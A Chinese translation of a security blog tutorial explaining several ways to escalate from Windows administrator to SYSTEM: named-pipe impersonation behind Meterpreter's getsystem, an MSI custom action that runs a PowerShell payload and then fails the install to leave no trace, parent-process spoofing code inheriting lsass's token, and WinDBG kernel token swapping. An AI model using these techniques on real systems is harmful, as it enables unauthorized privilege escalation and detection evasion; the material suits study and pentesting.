# 【技术分享】获取SYSTEM权限的多种姿势

阅读量 **415796**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-11-22 15:28:16

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.xpnsec.com

原文地址：<https://blog.xpnsec.com/becoming-system/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**简介**

****

对于许多渗透测试人员来说，Meterpreter的getsystem命令已成为获取SYSTEM帐户权限的默认方法，但是，您是否曾经想过其工作原理到底是什么呢？

在这篇文章中，我们不仅会将详细介绍这种技术背后的工作原理，同时，还会探讨其他一些方法——尽管这些方法不太流行，但是正因为如此，它们才更容易绕过各种安全检测。

**Meterpreter的“getsystem”**

在阅读本文之前，您可能就用过Meterpreter中的getsystem模块。如果还没有用过的话，我可以为您做一个简单的介绍：getsystem是由Metasploit-Framework提供的一个模块，它可以将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户。

在继续阅读下文之前，让我们首先来了解一下如何模拟另一个用户。
模拟是Windows提供的一种非常有用的方法，通过该方法，一个进程可以模拟另一个用户的安全上下文。
例如，如果一个进程用于FTP服务器，它不仅会对用户进行身份验证，并且只希望他们访问特定用户拥有的文件，这种情况下，可以让该进程模拟该用户帐户，并让Windows强制进行相应的安全检测。

为了便于模拟，Windows向开发者公开了许多本地API，例如：

**ImpersonateNamedPipeClient**

**ImpersonateLoggedOnUser**

**ReturnToSelf**

**LogonUser**

**OpenProcessToken**

其中，ImpersonateNamedPipeClient
API调用是getsystem模块的关键功能，与提权方式息息相关。这个API调用允许一个进程模拟另一个连接到命名管道并对该管道进行数据写入操作（最后一个要求是非常重要的）的另一个进程的访问令牌。
例如，如果一个属于“受害者”的进程连接到了一个属于“攻击者”的命名管道，并且对该管道进行写入操作的话，那么这种情况下，攻击者就可以调用ImpersonateNamedPipeClient来取得“受害者”的模拟令牌，这样的话，就可以模拟该用户了。显然，这会导致一个巨大的安全隐患，因此，必须要求进程拥有SeImpersonatePrivilege权限。

在默认情况下，该权限仅适用于一些具有非常高的特权的用户：

但是，这意味着本地Administrator账户也可以使用ImpersonateNamedPipeClient——这正是getystem背后的工作原理：

1.getsystem创建一个新的Windows服务，并将其设置为连接命名管道时以SYSTEM身份运行。

2.getsystem生成一个进程，该进程会创建一个命名管道并等待来自上述服务的连接。

3.Windows服务启动，连接到命名管道。

4.上面生成的进程接收连接，并调用ImpersonateNamedPipeClient，这样就会为SYSTEM用户创建一个模拟令牌。

然后，我们只需用新收集的SYSTEM模拟令牌生成 **cmd.exe** ，这样，我们就获得了一个具有SYSTEM权限的进程。

为了演示如何在不借助Meterpreter-Framework的情况下来实现这个功能，我以前曾经发布了一个简单的工具，该工具能够在执行过程中生成一个SYSTEM
shell。这个工具的运行机制与上述步骤完全一致，该工具的下载地址为<https://github.com/xpn/getsystem-offline> 。

下面的视频展示了它的具体执行过程：

（视频地址）

现在，我们已经弄清楚了getsystem的运行机制，接下来，我们将为读者介绍获取SYSTEM权限的其他方式。

**MSIExec方法**

对于已经在Twitter上关注我的人来说，最近很可能已经看过我的一个推文，其中讲解如何使用.MSI包生成具有SYSTEM权限的进程：

There is something nice about embedding a Powershell one-liner in a .MSI, nice
alternative way to execute as SYSTEM 🙂 pic.twitter.com/cXAK6ntpcJ

— Adam (@_xpn_) November 6,
2017（链接地址：<https://twitter.com/_xpn_/status/927671297466871808?ref_src=twsrc%5Etfw>
）

这个方法是我研究DOQU 2.0恶意软件后得出的，因为相应的攻击者正在将恶意软件封装在MSI文件中进行传播。

事实证明，通过MSI启动代码的好处是，您能够在安装过程中获得SYSTEM权限。为了理解其中的原理，我们需要研究一下WIX
Toolset（链接地址：http://wixtoolset.org/）——这是一个开源项目，可以用来从XML构建脚本创建MSI文件。

WIX框架由多个工具组成，但我们只重点关注下面两个：

**candle.exe——接收.WIX XML文件并输出.WIXOBJ**

**light.exe——接收.WIXOBJ并创建一个.MSI**

通过阅读WIX的文档，我们发现它提供了一些自定义操作，以便开发人员可以在安装过程中启动脚本和进程。
在CustomAction文档中，我们看到了一些有趣的东西：

文档中给出了一个简单的方法，通过提供一个将Impersonate属性设置为false的自定义操作，就可以让MSI以SYSTEM身份来启动一个进程。

制作完成后，我们的WIX文件将如下所示：

这里应该有生成MSI的许多样板代码，为了让版面更简洁，这里从略。实际上，我们只需关注下列自定义操作：

    
    
    <Property Id="cmdline">powershell...</Property>
    <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>

这个自定义操作负责以SYSTEM身份执行我们提供的cmdline（请注意Property标签，这是解决长Powershell命令的ExeCommand属性长度限制的好办法）。

另一个有用的技巧是，确保在我们的命令执行后安装失败，这样做的好处是，可以防止安装程序添加一个新的条目到“添加或删除程序”。为此，可以让它执行一些非法的VBScript：

    
    
    <CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
      invalid vbs to fail install
    </CustomAction>

最后，创建我们的 **InstallExecuteSequence** 标签，让它负责按顺序执行我们的自定义操作：

    
    
    <InstallExecuteSequence>
      <Custom Action="SystemShell" After="InstallInitialize"></Custom>
      <Custom Action="FailInstall" Before="InstallFiles"></Custom>
    </InstallExecuteSequence>

所以，在执行过程中：

1.我们的第一个自定义操作将启动，使我们的payload以SYSTEM身份运行。

2.我们的第二个自定义操作将启动，它会执行一些非法的VBScript代码，然后，只要代码一出错，安装过程就会被迫停止。

为了将其编译成MSI，我们将上述内容保存为名为“msigen.wix”的文件，并执行以下命令：

    
    
    candle.exe msigen.wix
    torch.exe msigen.wixobj

最后，运行MSI文件来执行我们的payload，如下所示：

**PROC_THREAD_ATTRIBUTE_PARENT_PROCESS** 方法

这种变身SYSTEM用户的方法，实际上是James Forshaw在一篇关于如何变成“受信任的安装程序”的文章中提出来的。

同样，几个星期前我也在推特上就提到了这个技术：

Loving @tiraniddo （链接地址：<https://twitter.com/tiraniddo?ref_src=twsrc%5Etfw>
）New-Win32Process cmdlet for a nice clean way to grab SYSTEM user account.
<https://t.co/bEFYocOAKn> （链接地址：<https://t.co/bEFYocOAKn>
）pic.twitter.com/aBzzho3jKS（链接地址：<https://t.co/aBzzho3jKS> ）

— Adam (@_xpn_) November
2（链接地址：<https://twitter.com/_xpn_/status/926092979433066496?ref_src=twsrc%5Etfw>
）, 2017

这种技术的工作机制是，借助 **CreateProcess** Win32 API调用，通过
**PROC_THREAD_ATTRIBUTE_PARENT_PROCESS** 属性对新生成的进程的父进程进行赋值。

如果我们查看这个设置的说明文档，我们会看到以下内容：

所以，这意味着如果我们设置了新生成的进程的父进程，我们将继承这个父进程的令牌。所以，我们可以通过进程令牌来获取SYSTEM帐户的权限。

我们可以创建一个新的进程，并通过以下代码来设置父进程：

    
    
    int pid;
    HANDLE pHandle = NULL;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T size;
    BOOL ret;
    // Set the PID to a SYSTEM process PID
    pid = 555;
    EnableDebugPriv();
    // Open the process which we will inherit the handle from
    if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
    printf("Error opening PID %dn", pid);
    return 2;
    }
    // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
    GetProcessHeap(),
    0,
    size
    );
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    // Finally, create the process
    ret = CreateProcessA(
    "C:\Windows\system32\cmd.exe", 
    NULL,
    NULL, 
    NULL, 
    true, 
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
    NULL,
    NULL, 
    reinterpret_cast<LPSTARTUPINFOA>(&si), 
    &pi
    );
    if (ret == false) {
    printf("Error creating new process (%d)n", GetLastError());
    return 3;
    }

编译后，我们就可以通过它启动一个进程，并继承父进程的访问令牌，这样就能够以system身份运行诸如 **lsass.exe** 之类的程序了：

这个技术的的来源在这里（链接地址：<https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6>
）。

另外，NtObjectManager（链接地址：<https://www.powershellgallery.com/packages/NtObjectManager/1.0.1>
）提供了一个非常简单的方法来实现这个效果，不过它使用的是Powershell：

    
    
    New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)

**通过内核获取SYSTEM权限**

好吧，这个技术只是用来玩的，没有实战价值……但是，从某方面来说，它却可以用来展示Windows的进程令牌管理机制。

通常情况下，Windows内核提权利用代码会篡改内核地址空间中的进程结构，以便修改进程令牌。例如，在广为人知的MS15-010漏洞利用代码（在exploit-db中可以找到）中，我们可以看到许多操作访问令牌的引用。

为了对这种方法进行分析，我们将在Windows 7 x64虚拟机上使用WinDBG来考察如何通过操作内核结构提升我们cmd.exe进程的权限。

一旦连接了WinDBG，首先需要收集想要升级到SYSTEM权限的、正在运行的进程的相关信息。为此，可以使用!process命令：

!process 0 0 cmd.exe

返回后，可以看到与我们的进程有关的一些重要信息，例如打开句柄的数量以及进程环境块的地址：

    
    
    PROCESS fffffa8002edd580
        SessionId: 1  Cid: 0858    Peb: 7fffffd4000  ParentCid: 0578
        DirBase: 09d37000  ObjectTable: fffff8a0012b8ca0  HandleCount:  21.
        Image: cmd.exe

根据我们的目的，我们感兴趣的东西是它提供的PROCESS地址（在这个例子中是fffffa8002edd580），它实际上是一个指向EPROCESS结构的指针。
EPROCESS结构（根据Microsoft的文档（链接地址：<https://msdn.microsoft.com/en-us/library/windows/hardware/ff544273.aspx> ）称）中含有进程的各种重要信息，例如进程ID和对进程线程的引用。

在该结构的许多字段中有一个指向进程的访问令牌的指针，具体要看在TOKEN结构中定义。为了查看令牌的内容，首先需要计算出TOKEN的地址。 在Windows
7 x64上，进程TOKEN位于偏移量0x208处，当然，对于Windows的不同版本（以及可能的服务包）来说，这个地址会有所不同。
我们可以用下面的命令来查找这个指针：

    
    
    kd> dq fffffa8002edd580+0x208 L1

该命令将会返回令牌地址，具体如下所示：

    
    
    fffffa80`02edd788  fffff8a0`00d76c51

由于令牌地址是在EX_FAST_REF结构中引用的，因此我们必须对该值进行AND运算，才能获得真正的指针地址：

    
    
    kd> ? fffff8a0`00d76c51 & ffffffff`fffffff0
    Evaluate expression: -8108884136880 = fffff8a0`00d76c50

这意味着cmd.exe的TOKEN的真正地址是fffff8a000d76c50。 接下来，我们可以使用以下命令为我们的进程转储TOKEN结构成员：

    
    
    kd> !token fffff8a0`00d76c50

下面，我们看看进程令牌中的信息：

    
    
    User: S-1-5-21-3262056927-4167910718-262487826-1001
    User Groups:
     00 S-1-5-21-3262056927-4167910718-262487826-513
        Attributes - Mandatory Default Enabled
     01 S-1-1-0
        Attributes - Mandatory Default Enabled
     02 S-1-5-32-544
        Attributes - DenyOnly
     03 S-1-5-32-545
        Attributes - Mandatory Default Enabled
     04 S-1-5-4
        Attributes - Mandatory Default Enabled
     05 S-1-2-1
        Attributes - Mandatory Default Enabled
     06 S-1-5-11
        Attributes - Mandatory Default Enabled
     07 S-1-5-15
        Attributes - Mandatory Default Enabled
     08 S-1-5-5-0-2917477
        Attributes - Mandatory Default Enabled LogonId
     09 S-1-2-0
        Attributes - Mandatory Default Enabled
     10 S-1-5-64-10
        Attributes - Mandatory Default Enabled
     11 S-1-16-8192
        Attributes - GroupIntegrity GroupIntegrityEnabled
    Primary Group: S-1-5-21-3262056927-4167910718-262487826-513
    Privs:
     19 0x000000013 SeShutdownPrivilege               Attributes -     23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
     25 0x000000019 SeUndockPrivilege                 Attributes -     33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes -     34 0x000000022 SeTimeZonePrivilege               Attributes -
那么，我们如何才能将自己的进程的权限提升到SYSTEM级别呢？实际上，我们只需要从另一个具有SYSTEM特权的进程（比如lsass.exe）中窃取这个令牌，然后使用以下命令将其粘贴到我们的cmd.exe的EPROCESS中即可：

    
    
    kd> !process 0 0 lsass.exe
    kd> dq <LSASS_PROCESS_ADDRESS>+0x208 L1
    kd> ? <LSASS_TOKEN_ADDRESS> & FFFFFFFF`FFFFFFF0
    kd> !process 0 0 cmd.exe
    kd> eq <CMD_EPROCESS_ADDRESS+0x208> <LSASS_TOKEN_ADDRESS>

为了让读者观看上述技术在实际系统上的运行情况，我特意录制了一段视频，生动展示了 **CMD.EXE** 从低级用户权限提升至 **SYSTEM**
权限的过程：

本文翻译自blog.xpnsec.com [原文链接](https://blog.xpnsec.com/becoming-system/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **shan66** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87292](/post/id/87292)

安全客 - 有思想的安全新媒体

本文转载自: [blog.xpnsec.com](https://blog.xpnsec.com/becoming-system/)

如若转载,请注明出处： <https://blog.xpnsec.com/becoming-system/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __5赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0137bdcb0fbd458b88.jpg) shan66

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

